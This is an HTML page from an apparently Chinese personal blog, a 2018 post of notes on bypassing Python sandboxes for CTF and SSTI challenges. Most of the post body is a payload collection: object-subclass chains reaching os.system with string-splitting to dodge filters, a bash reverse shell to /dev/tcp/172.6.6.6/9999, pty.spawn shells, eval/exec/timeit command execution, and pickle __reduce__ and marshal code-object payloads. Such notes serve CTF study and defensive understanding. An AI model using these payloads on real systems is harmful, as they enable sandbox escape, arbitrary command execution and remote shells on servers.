@@ -1,0 +1,1342 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="web,绕过,python,魔术方法,类属性,沙箱逃逸,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="BLOG of little potato" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/lypto.ico?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="在看到一些python命令执行的ctf题目的时候，才发现原来自己对python的了解还是那么的浅，但是基于python的web框架也日益盛行，python的命令执行是个需要好好学习的一个知识点，常见的漏洞利用方式或者说CTF的题目有SSTI，python沙箱绕过类pwn,所以为了恶补一下之前没有认真对待的python内置方法和魔术方法这些比较容易忽略的细节，现在把相关知识点总结如下。">
+<meta name="keywords" content="web,绕过,python,魔术方法,类属性,沙箱逃逸">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python沙箱绕过相关">
+<meta property="og:url" content="http://yoursite.com/2018/07/31/python沙箱/index.html">
+<meta property="og:site_name" content="BLOG of little potato">
+<meta property="og:description" content="在看到一些python命令执行的ctf题目的时候，才发现原来自己对python的了解还是那么的浅，但是基于python的web框架也日益盛行，python的命令执行是个需要好好学习的一个知识点，常见的漏洞利用方式或者说CTF的题目有SSTI，python沙箱绕过类pwn,所以为了恶补一下之前没有认真对待的python内置方法和魔术方法这些比较容易忽略的细节，现在把相关知识点总结如下。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/myimages/python沙箱/onepic.png">
+<meta property="og:updated_time" content="2018-12-05T14:59:03.047Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python沙箱绕过相关">
+<meta name="twitter:description" content="在看到一些python命令执行的ctf题目的时候，才发现原来自己对python的了解还是那么的浅，但是基于python的web框架也日益盛行，python的命令执行是个需要好好学习的一个知识点，常见的漏洞利用方式或者说CTF的题目有SSTI，python沙箱绕过类pwn,所以为了恶补一下之前没有认真对待的python内置方法和魔术方法这些比较容易忽略的细节，现在把相关知识点总结如下。">
+<meta name="twitter:image" content="http://yoursite.com/myimages/python沙箱/onepic.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":0,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/07/31/python沙箱/">
+
+
+
+
+
+  <title>python沙箱绕过相关 | BLOG of little potato</title>
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?47d7b880e7f466d86f6a2755e80a6337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+	<a href="https://github.com/IversionBY"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BLOG of little potato</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/31/python沙箱/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="little potato">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/109.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BLOG of little potato">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">python沙箱绕过相关</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-31T22:46:44+08:00">
+                Jul 31 2018
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/07/31/python沙箱/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/07/31/python沙箱/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>在看到一些python命令执行的ctf题目的时候，才发现原来自己对python的了解还是那么的浅，但是基于python的web框架也日益盛行，python的命令执行是个需要好好学习的一个知识点，常见的漏洞利用方式或者说CTF的题目有SSTI，python沙箱绕过类pwn,所以为了恶补一下之前没有认真对待的python内置方法和魔术方法这些比较容易忽略的细节，现在把相关知识点总结如下。<br><a id="more"></a></p>
+</blockquote>
+<h1 id="payload搜集"><a href="#payload搜集" class="headerlink" title="payload搜集"></a>payload搜集</h1><h2 id="沙箱绕过中常用的os模块导入和命令执行姿势"><a href="#沙箱绕过中常用的os模块导入和命令执行姿势" class="headerlink" title="沙箱绕过中常用的os模块导入和命令执行姿势"></a>沙箱绕过中常用的os模块导入和命令执行姿势</h2><p>python的object类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2：</span></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">61</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">40</span>](filename).read()</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval,<span class="string">'os.system("ls")'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1"'</span>)</span><br><span class="line"></span><br><span class="line">python3：</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>]</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">117</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'__global'</span>+<span class="string">'s__'</span>)[<span class="string">'os'</span>].__dict__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure></p>
+<h2 id="其他python命令执行的姿势"><a href="#其他python命令执行的姿势" class="headerlink" title="其他python命令执行的姿势"></a>其他python命令执行的姿势</h2><h3 id="导入os模块"><a href="#导入os模块" class="headerlink" title="导入os模块"></a>导入os模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system() </span><br><span class="line">os.popen()</span><br></pre></td></tr></table></figure>
+<h3 id="导入commands模块"><a href="#导入commands模块" class="headerlink" title="导入commands模块"></a>导入commands模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import commands</span><br><span class="line">commands.getstatusoutput() </span><br><span class="line">commands.getoutput()</span><br><span class="line">commands.getstatus()</span><br></pre></td></tr></table></figure>
+<h3 id="导入subprocess模块"><a href="#导入subprocess模块" class="headerlink" title="导入subprocess模块"></a>导入subprocess模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.call(command, shell=True) </span><br><span class="line">subprocess.Popen(command, shell=True)</span><br><span class="line">subprocess.check_output(command, shell=True)</span><br></pre></td></tr></table></figure>
+<h3 id="导入pty"><a href="#导入pty" class="headerlink" title="导入pty"></a>导入pty</h3><p>这个地方很多时候可以用来进行反弹shell的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pty</span><br><span class="line">pty.spawn()</span><br><span class="line"></span><br><span class="line">#例子：</span><br><span class="line">import pty</span><br><span class="line">pty.spawn(&apos;/bin/bash&apos;)</span><br></pre></td></tr></table></figure></p>
+<h3 id="内置函数execfile-可以用来执行一个二进制文件"><a href="#内置函数execfile-可以用来执行一个二进制文件" class="headerlink" title="内置函数execfile()可以用来执行一个二进制文件"></a>内置函数execfile()可以用来执行一个二进制文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">execfile(filename[, globals[, locals]])</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">参数</span><br><span class="line">filename -- 文件名。</span><br><span class="line">globals -- 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</span><br><span class="line">locals -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</span><br><span class="line">返回值</span><br><span class="line">返回表达式执行结果。</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#例子：</span><br><span class="line">execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="导入timeit模块，间接执行命令"><a href="#导入timeit模块，间接执行命令" class="headerlink" title="导入timeit模块，间接执行命令"></a>导入timeit模块，间接执行命令</h3><p>注意到这个模块中主要有以下两个函数，都可以执行命令，后者可以执行一个命令多次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">timeit(stmt=&apos;pass&apos;, setup=&apos;pass&apos;, timer=&lt;defaulttimer&gt;, number=1000000)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">返回：</span><br><span class="line">    返回执行stmt这段代码number遍所用的时间，单位为秒，float型</span><br><span class="line">参数：</span><br><span class="line">    stmt：要执行的那段代码</span><br><span class="line">    setup：执行代码的准备工作，不计入时间，一般是import之类的</span><br><span class="line">    timer：这个在win32下是time.clock()，linux下是time.time()，默认的，不用管</span><br><span class="line">    number：要执行stmt多少遍</span><br><span class="line">    </span><br><span class="line"> repeat(stmt=&apos;pass&apos;, setup=&apos;pass&apos;, timer=&lt;defaulttimer&gt;, repeat=3, number=1000000)</span><br><span class="line">这个函数比timeit函数多了一个repeat参数而已，表示重复执行timeit这个过程多少遍，返回一个列表，表示执行每遍的时间</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">#例子：</span><br><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1)</span><br></pre></td></tr></table></figure></p>
+<h3 id="内置函数eval和exec"><a href="#内置函数eval和exec" class="headerlink" title="内置函数eval和exec"></a>内置函数eval和exec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">描述</span><br><span class="line">eval() 函数用来执行一个字符串表达式，并返回表达式的值。</span><br><span class="line">语法</span><br><span class="line">以下是 eval() 方法的语法:</span><br><span class="line">eval(expression[, globals[, locals]])</span><br><span class="line">参数</span><br><span class="line">expression -- 表达式。</span><br><span class="line">globals -- 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</span><br><span class="line">locals -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</span><br><span class="line">返回值</span><br><span class="line">返回表达式计算结果。</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#例子：</span><br><span class="line">eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br><span class="line"></span><br><span class="line">#exec 执行储存在字符串或文件中的Python语句，相比于 eval，exec可以执行更复杂的Python代码，但是需要注意的是python3与python2的细微差别。</span><br><span class="line">#例子1（python3）：</span><br><span class="line">exec(&apos;print(&quot;Hello World&quot;)&apos;)</span><br><span class="line">#例子2（python2）</span><br><span class="line">exec&apos;print &quot;Hello World&quot;&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="platform库函数"><a href="#platform库函数" class="headerlink" title="platform库函数"></a>platform库函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">platform.popen() #执行cmd</span><br><span class="line">platform.platform() # 返回操作系统平台</span><br><span class="line">platform.uname() # 返回操作系统信息</span><br><span class="line">platform.system() # 返回操作系统平台</span><br><span class="line">platform.version() # 返回操作系统版本</span><br><span class="line">platform.machine() # 返回计算机类型</span><br><span class="line">platform.processor() # 返回计算机处理器类型</span><br><span class="line">platform.node() # 返回计算机网络名</span><br><span class="line">platform.python_version() # 返回Python版本号</span><br></pre></td></tr></table></figure>
+<h3 id="pickle命令执行"><a href="#pickle命令执行" class="headerlink" title="pickle命令执行"></a>pickle命令执行</h3><h4 id="重写-reduce-方法"><a href="#重写-reduce-方法" class="headerlink" title="重写__reduce__方法"></a>重写<code>__reduce__</code>方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import cPickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class genpoc(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        s = &quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;  #要执行的命令</span><br><span class="line">        return os.system, (s,)        #os.system(&quot;echo test &gt;poc.txt&quot;)</span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = cPickle.dumps(e)</span><br><span class="line"></span><br><span class="line">print poc</span><br></pre></td></tr></table></figure>
+<h4 id="运用marshal-pickle-code类型对象"><a href="#运用marshal-pickle-code类型对象" class="headerlink" title="运用marshal pickle code类型对象"></a>运用marshal pickle code类型对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import marshal</span><br><span class="line">import base64</span><br><span class="line">import cPickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def foo():#you should write your code in this function</span><br><span class="line">    import os</span><br><span class="line">    def fib(n):</span><br><span class="line">        if n &lt;= 1:</span><br><span class="line">            return n</span><br><span class="line">        return fib(n-1) + fib(n-2)</span><br><span class="line">    print &apos;fib(10) =&apos;, fib(10)</span><br><span class="line">    os.system(&apos;echo anycode &gt;&gt;poc.txt&apos;)</span><br><span class="line"></span><br><span class="line">try:#尝试使用cPickle来序列号代码对象</span><br><span class="line">    cPickle.dumps(foo.func_code)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print e #TypeError: can&apos;t pickle code objects</span><br><span class="line"></span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line">print code_serialized</span><br></pre></td></tr></table></figure>
+<h1 id="python-内置函数"><a href="#python-内置函数" class="headerlink" title="python 内置函数"></a>python 内置函数</h1><p><a href="http://www.runoob.com/python3/python3-built-in-functions.html" target="_blank" rel="noopener">菜鸟教程:http://www.runoob.com/python3/python3-built-in-functions.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BlockingIOError'</span>, <span class="string">'BrokenPipeError'</span>,</span><br><span class="line"><span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'ChildProcessError'</span>, <span class="string">'ConnectionAbortedError'</span>, <span class="string">'ConnectionError'</span>,</span><br><span class="line"><span class="string">'ConnectionRefusedError'</span>, <span class="string">'ConnectionResetError'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FileExistsError'</span>,</span><br><span class="line"><span class="string">'FileNotFoundError'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'InterruptedError'</span>,</span><br><span class="line"><span class="string">'IsADirectoryError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'ModuleNotFoundError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotADirectoryError'</span>, <span class="string">'NotImplemented'</span>,</span><br><span class="line"><span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'PermissionError'</span>, <span class="string">'ProcessLookupError'</span>, <span class="string">'RecursionError'</span>, <span class="string">'ReferenceError'</span>,</span><br><span class="line"><span class="string">'ResourceWarning'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StopAsyncIteration'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>,</span><br><span class="line"><span class="string">'TimeoutError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>,</span><br><span class="line"><span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'WindowsError'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'_'</span>, <span class="string">'__build_class__'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>, <span class="string">'abs'</span>,</span><br><span class="line"><span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'ascii'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>,</span><br><span class="line"><span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'exit'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>,</span><br><span class="line"><span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>,</span><br><span class="line"><span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'vars'</span>, <span class="string">'zip'</span>]</span><br></pre></td></tr></table></figure></p>
